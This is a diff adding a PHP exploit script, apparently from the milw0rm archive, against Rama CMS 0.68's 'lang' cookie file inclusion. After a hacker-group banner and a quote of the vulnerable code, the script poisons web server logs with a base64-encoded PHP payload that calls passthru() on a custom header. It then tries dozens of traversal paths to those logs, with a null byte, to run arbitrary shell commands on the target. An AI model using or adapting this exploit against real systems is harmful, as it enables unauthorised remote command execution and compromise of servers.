@@ -1,0 +1,265 @@
+<?
+
+print '
+:::::::::  :::::::::: :::     ::: ::::::::::: :::
+:+:    :+: :+:        :+:     :+:     :+:     :+:
++:+    +:+ +:+        +:+     +:+     +:+     +:+
++#+    +:+ +#++:++#   +#+     +:+     +#+     +#+
++#+    +#+ +#+         +#+   +#+      +#+     +#+
+#+#    #+# #+#          #+#+#+#       #+#     #+#
+#########  ##########     ###     ########### ##########
+::::::::::: ::::::::::     :::     ::::    ::::
+    :+:     :+:          :+: :+:   +:+:+: :+:+:+
+    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+
+    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+
+    +#+     +#+        +#+     +#+ +#+       +#+
+    #+#     #+#        #+#     #+# #+#       #+#
+    ###     ########## ###     ### ###       ###
+
+   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
+
+
+[Exploit name: Rama CMS <= 0.68 (Cookie: lang) Local File Include Exploit
+[Script name: Rama CMS v.0.68
+[Script site: http://www.hotscripts.com/jump.php?listing_id=48318&jump_type=1
+
+
+
+
+Find by: Kacper (a.k.a Rahim)
+
+
+========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <========
+========>         http://www.rahim.webd.pl/            <========
+
+Contact: kacper1964@yahoo.pl
+
+(c)od3d by Kacper
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Greetings DragonHeart and all DEVIL TEAM Patriots :)
+- Leito & Leon
+TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein
+Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios,
+mIvus, nukedclx, SkD, wacky, xoron
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+                Greetings for 4ll Fusi0n Group members ;-)
+                and all members of hacker.com.pl ;)
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+';
+
+
+/*
+works with register_globals=On
+
+in lang.php line 27-43:
+....
+if(isset($_GET['lang'])){
+	setcookie('lang',htmlspecialchars($_GET['lang']));
+	$lang = htmlspecialchars($_GET['lang']);
+	$_COOKIE['lang'] = $lang;
+}else if(isset($_COOKIE['lang'])){                       //  <-------{1}
+	$lang = htmlspecialchars($_COOKIE['lang']);
+}else{
+	$lang = DEFAUL_LANG;
+	$_COOKIE['lang'] = $lang;            //  <-------{2}
+}
+
+if(file_exists("language/$lang.php")){
+    include_once("language/$lang.php");         //  <-------{3}
+}else{
+    include_once("language/en.php");
+}
+?>
+....
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+by Kacper ;)
+*/
+
+
+if ($argc<4) {
+print_r('
+-----------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path cmd OPTIONS
+host:      target server (ip/hostname)
+path:      Rama CMS path
+cmd:       a shell command (ls -la)
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' 2.2.2.2 /Rama_CMS/ ls -la -P1.1.1.1:80
+php '.$argv[0].' 1.1.1.1 / ls -la
+-----------------------------------------------------------------------------
+');
+
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function wyslij_pakiety($pakiet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$pakiet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";
+
+$port=80;
+$proxy="";
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+
+echo "[1] insert evil code in logfiles ...\r\n\r\n";
+$hauru = base64_decode("PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuL".
+"i5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS".
+"4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyB".
+"UbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2Vj".
+"aG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvI".
+"jtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYX".
+"NzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+");
+
+$pakiet="GET ".$p.$hauru." HTTP/1.0\r\n";
+$pakiet.="User-Agent: ".$hauru." Googlebot/2.1\r\n";
+$pakiet.="Host: ".$host."\r\n";
+$pakiet.="Connection: close\r\n\r\n";
+wyslij_pakiety($pakiet);
+sleep(3);
+
+$paths= array (
+"../../../../../var/log/httpd/access_log",
+"../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../../apache/logs/error.log",
+"../../../../apache/logs/access.log",
+"../../../../../apache/logs/error.log",
+"../../../../../apache/logs/access.log",
+"../logs/error.log",
+"../logs/access.log",
+"../../logs/error.log",
+"../../logs/access.log",
+"../../../logs/error.log",
+"../../../logs/access.log",
+"../../../../logs/error.log",
+"../../../../logs/access.log",
+"../../../../../logs/error.log",
+"../../../../../logs/access.log",
+"../../../../../etc/httpd/logs/access_log",
+"../../../../../etc/httpd/logs/access.log",
+"../../../../../etc/httpd/logs/error_log",
+"../../../../../etc/httpd/logs/error.log",
+"../../../../../var/www/logs/access_log",
+"../../../../../var/www/logs/access.log",
+"../../../../../usr/local/apache/logs/access_log",
+"../../../../../usr/local/apache/logs/access.log",
+"../../../../../var/log/apache/access_log",
+"../../../../../var/log/apache/access.log",
+"../../../../../var/log/access_log",
+"../../../../../var/www/logs/error_log",
+"../../../../../var/www/logs/error.log",
+"../../../../../usr/local/apache/logs/error_log",
+"../../../../../usr/local/apache/logs/error.log",
+"../../../../../var/log/apache/error_log",
+"../../../../../var/log/apache/error.log",
+"../../../../../var/log/access_log",
+"../../../../../var/log/error_log"
+);
+
+for ($i=0; $i<=count($paths)-1; $i++)
+{
+$a=$i+2;
+echo "[".$a."] Check Path: ".$paths[$i]."\r\n";
+echo "remote code execution...wait..\n";
+$pakiet ="GET ".$p."lang.php HTTP/1.1\r\n";
+$pakiet.="Cookie: lang=../".$paths[$i]."%00;\r\n";
+$pakiet.="HAURU: ".$cmd."\r\n";
+$pakiet.="Host: ".$host."\r\n";
+$pakiet.="Connection: Close\r\n\r\n";
+wyslij_pakiety($pakiet);
+if (strstr($html,"Hauru"))
+{
+$temp=explode("Hauru",$html);
+die($temp[1]);
+}
+}
+echo "Exploit err0r :(\r\n";
+echo "Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n";
+?>
+
+# milw0rm.com [2006-11-12]
